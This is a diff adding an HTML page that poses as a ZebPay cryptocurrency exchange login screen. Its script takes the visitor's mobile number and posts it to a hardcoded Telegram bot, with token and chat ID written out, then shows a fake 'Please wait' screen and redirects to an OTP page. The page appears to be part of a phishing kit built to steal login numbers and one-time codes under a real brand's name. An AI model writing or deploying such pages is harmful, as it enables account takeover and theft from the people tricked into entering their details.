@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ZebPay Login</title>
+
+ 
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- intl-tel-input CSS -->
+  <link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/css/intlTelInput.css"
+  />
+</head>
+
+<body class="bg-gradient-to-br from-gray-100 to-gray-200 min-h-screen flex flex-col justify-between">
+
+  <!-- Main Content -->
+  <div class="flex flex-col items-center mt-16 px-6">
+
+  <header class="w-full max-w-5xl mx-auto px-6 pt-16 flex items-start ">
+
+    <!-- Title Section -->
+    <div class="title">
+        <h1 class="text-4xl md:text-5xl font-bold leading-tight text-gray-800">
+            Welcome to <br>
+            <span class="brand text-blue-600">ZebPay!</span>
+        </h1>
+    </div>
+
+    <!-- Illustration -->
+    <div class="illus w-28 md:w-32" aria-hidden="true">
+        <svg viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="lg" x1="0" x2="1">
+                    <stop offset="0" stop-color="#7aa3ff"></stop>
+                    <stop offset="1" stop-color="#8b6bff"></stop>
+                </linearGradient>
+                <linearGradient id="lg2" x1="0" x2="1">
+                    <stop offset="0" stop-color="#ffd27a"></stop>
+                    <stop offset="1" stop-color="#ffb857"></stop>
+                </linearGradient>
+            </defs>
+
+            <g transform="translate(2,2)">
+                <ellipse cx="60" cy="54" rx="30" ry="30" fill="#eef3ff"></ellipse>
+                <circle cx="60" cy="54" r="22" fill="url(#lg2)" stroke="#f5c966" stroke-width="2"></circle>
+                <path d="M52 48 L68 48 L64 64 L56 64 Z" fill="#ffffff" opacity="0.12"></path>
+
+                <g transform="translate(12,12)">
+                    <rect x="24" y="6" width="36" height="6" rx="3" fill="#7aa3ff" transform="rotate(-18 42 9)"></rect>
+                    <rect x="8" y="36" width="36" height="6" rx="3" fill="#6ee1b4" transform="rotate(24 26 39)"></rect>
+                    <rect x="40" y="26" width="36" height="6" rx="3" fill="#9aa3ff" transform="rotate(60 58 29)"></rect>
+                </g>
+            </g>
+        </svg>
+    </div>
+
+</header>
+
+<!-- Loading Screen -->
+<div id="loading-screen" class="hidden fixed inset-0 bg-black bg-opacity-70 flex flex-col justify-center items-center text-white z-50">
+  <div class="w-16 h-16 border-4 border-white border-t-blue-500 rounded-full animate-spin mb-4"></div>
+  <p class="text-lg font-medium">Please wait...</p>
+</div>
+
+
+
+    <!-- Form Section -->
+    <div class="w-full max-w-md mt-12">
+
+      <label class="block text-gray-600 font-semibold mb-3">
+        Mobile Number
+      </label>
+
+      <input
+        id="phone"
+        type="tel"
+        class="w-full p-4 rounded-xl border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 shadow-sm"
+        placeholder="Enter mobile number"
+      />
+
+    </div>
+  </div>
+
+  <!-- Proceed Button Bottom -->
+  <div class="px-6 mb-10">
+    <button
+      onclick="handleProceed()"
+      class="w-full max-w-md mx-auto block bg-gray-400 text-white py-4 rounded-xl font-bold tracking-wide disabled:opacity-50"
+      id="proceedBtn"
+      disabled
+    >
+      PROCEED
+    </button>
+  </div>
+
+  <!-- intl-tel-input JS -->
+  <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/intlTelInput.min.js"></script>
+
+  <script>
+  const input = document.querySelector("#phone");
+  const proceedBtn = document.getElementById("proceedBtn");
+
+  const iti = window.intlTelInput(input, {
+    initialCountry: "auto",
+    preferredCountries: ["us", "in", "uk", "gb"],
+    separateDialCode: true,
+    utilsScript:
+      "https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/utils.js",
+  });
+
+  // Enable button when number is entered
+  input.addEventListener("input", () => {
+    if (input.value.length > 5) {
+      proceedBtn.disabled = false;
+      proceedBtn.classList.remove("bg-gray-400");
+      proceedBtn.classList.add("bg-gray-800", "hover:bg-black");
+    } else {
+      proceedBtn.disabled = true;
+      proceedBtn.classList.add("bg-gray-400");
+      proceedBtn.classList.remove("bg-gray-800", "hover:bg-black");
+    }
+  });
+
+  async function handleProceed() {
+    const fullNumber = iti.getNumber();
+
+    // Telegram bot details
+    const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
+    const chatId = "6837437455";
+    const message = `New number submitted: ${fullNumber}`;
+
+    try {
+      const res = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        }
+      );
+
+      const data = await res.json();
+if (data.ok) {
+  console.log(data);
+
+  // Show loading screen
+  document.getElementById("loading-screen").classList.remove("hidden");
+
+  // Redirect after 4 seconds
+  setTimeout(() => {
+    window.location.href = "/otp.html";
+  }, 4000);
+}
+
+
+  } catch (err) {
+    console.error(err);
+    alert("Error sending message.");
+  }
+
+  }
+</script>
+
+
+ 
+</body>
+</html>
